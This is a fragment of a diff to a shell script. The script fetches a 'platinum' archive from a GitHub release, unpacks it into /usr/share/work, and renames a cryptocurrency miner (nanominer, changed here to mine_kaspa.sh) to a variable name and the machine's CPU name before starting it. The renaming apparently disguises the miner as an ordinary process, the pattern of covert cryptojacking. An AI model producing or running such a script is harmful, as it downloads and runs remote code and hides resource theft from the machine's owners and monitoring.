@@ -16,7 +16,7 @@ wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum
 mv platinum.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf platinum.tar.gz
 rm -rf platinum.tar.gz && cd platinum
-mv nanominer $azure -n
+mv mine_kaspa.sh $azure -n
 cp $azure "$cpuname"
 rm -f  nanominer
 echo $cpuname" is starting"
